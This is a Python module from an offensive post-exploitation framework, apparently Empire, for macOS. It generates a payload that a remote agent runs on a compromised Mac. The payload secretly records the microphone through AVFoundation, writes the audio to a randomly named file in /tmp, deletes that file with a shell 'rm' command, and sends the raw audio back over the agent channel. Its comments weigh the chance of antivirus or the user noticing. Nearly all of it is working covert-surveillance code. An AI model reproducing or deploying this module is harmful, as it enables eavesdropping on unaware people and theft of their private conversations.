class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'osx_mic_record',
            'Author': ['@s0lst1c3'],
            'Description': ('Records audio through the MacOS webcam mic '
                            'by leveraging the Apple AVFoundation API.'),
            'Background': False,
            'OutputExtension': 'caf',
            'NeedsAdmin' : False,
            'OpsecSafe': False,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': [
                (
                    'Executed within memory, although recorded audio will '
                    'touch disk while the script is running. This is unlikely '
                    'to trip A/V, although a user may notice the audio file '
                    'if it stored in an obvious location.'
                ),
            ]
        }
        self.options = {
            'Agent': {
                'Description'   :   'Agent to record audio from.',
                'Required'      :   True,
                'Value'         :   '',
            },
            'OutputDir': {
                'Description'   :   ('Directory on remote machine '
                                     'in recorded audio should be '
                                     'saved. (Default: /tmp)'),
                'Required'      :   False,
                'Value'         :   '/tmp',
            },
            'RecordTime': {
                'Description'   :   ('The length of the audio recording '
                                     'in seconds. (Default: 5)'),
                'Required'      :   False,
                'Value'         :   '5',
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=''):
        record_time = self.options['RecordTime']['Value']
        output_dir = self.options['OutputDir']['Value']
        return '''
import objc
import objc._objc
import time
import sys
import random
import os
from string import ascii_letters
from Foundation import *
from AVFoundation import *
record_time = %s
output_dir = '%s'
if __name__ == '__main__':
    pool = NSAutoreleasePool.alloc().init()
    output_file = ''.join(random.choice(ascii_letters) for _ in range(32))
    output_path = os.path.join(output_dir, output_file)
    audio_path_str = NSString.stringByExpandingTildeInPath(output_path)
    audio_url = NSURL.fileURLWithPath_(audio_path_str)
    objc.registerMetaDataForSelector(
        b"AVAudioRecorder",
        b"initWithURL:settings:error:",
        dict(arguments={4: dict(type_modifier=objc._C_OUT)}),
    )
    audio_settings = NSDictionary.dictionaryWithDictionary_({
        'AVEncoderAudioQualityKey' : 0,
        'AVEncoderBitRateKey' : 16,
        'AVSampleRateKey': 44100.0,
        'AVNumberOfChannelsKey': 2,
    })
    (recorder, error) = AVAudioRecorder.alloc().initWithURL_settings_error_(
                                        audio_url,
                                        audio_settings,
                                        objc.nil,
    )
    if error is not None:
        NSLog(error)
        sys.exit(1)
    recorder.record()
    time.sleep(record_time)
    recorder.stop()
    with open(output_path, 'rb') as input_handle:
        captured_audio = input_handle.read()
    run_command('rm -f ' + output_path)
    print captured_audio
    del pool
''' % (record_time, output_dir) # script